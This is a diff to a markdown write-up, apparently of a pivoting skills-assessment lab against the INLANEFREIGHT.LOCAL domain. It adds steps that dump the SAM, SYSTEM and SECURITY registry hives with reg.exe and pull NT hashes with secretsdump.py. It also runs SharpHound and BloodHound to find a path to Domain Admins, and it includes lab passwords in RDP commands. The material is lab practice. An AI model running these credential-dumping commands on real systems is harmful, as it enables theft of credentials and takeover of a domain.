@@ -156,9 +156,9 @@ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!' /dynamic-re
 
 ```
 cd c:\temp
-reg.exe save hklm\sam C:\sam.save
-reg.exe save hklm\system C:\system.save
-reg.exe save hklm\security C:\security.save
+reg.exe save hklm\sam C:\temp\sam.save
+reg.exe save hklm\system C:\temp\system.save
+reg.exe save hklm\security C:\temp\security.save
 ```  
 
 ![pivot-skills-assessment-SAM-Attack](/images/pivot-skills-assessment-SAM-Attack.png)  
@@ -219,8 +219,34 @@ proxychains xfreerdp /v:172.16.5.35:8080 /u:vfrank /p:'Imply wet Unmasked!' /d:I
 
 ## Enumerate Win10 vFrank  
 
+>Discover user `vfrank` is local administrator on the windows 10 workstation.
+>Perform SAM attack again and copy save registry hives to kali via RDP tunnel.  
 
+![pivot-skills-assessment-pivotwin10](/images/pivot-skills-assessment-pivotwin10.png)  
 
+>Using secretsdump.py to extract NT hashes.
 
+```
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
+```  
 
+## Active Directory  
 
+>Target the Domain with the credentials of `vfrank` and his password `Imply wet Unmasked!` for the `INLANEFREIGHT.LOCAL` domain.  
+
+### Bloodhound  
+
+>Transfer the windows binary `SharpHound.exe` to the windows 10 domain joined host to run data collection.  
+
+```
+sharphound.exe
+```  
+
+>Copy the collected ZIP data file to kali, to import into `Bloodhound`.  
+>Login to `bloodhound as username `neo4j` and my favourite Ethical @ Hacking password since my studies in 2019!.  
+
+![pivot-skills-assessment-sharphound](/images/pivot-skills-assessment-sharphound.png)  
+
+>Bloodhound analysis query: Shortest paths to Domain Admins from Owned Principals indicate our use is domain admin member.
+
+![End-of-the-rainbox](/images/End-of-the-rainbox.png)  
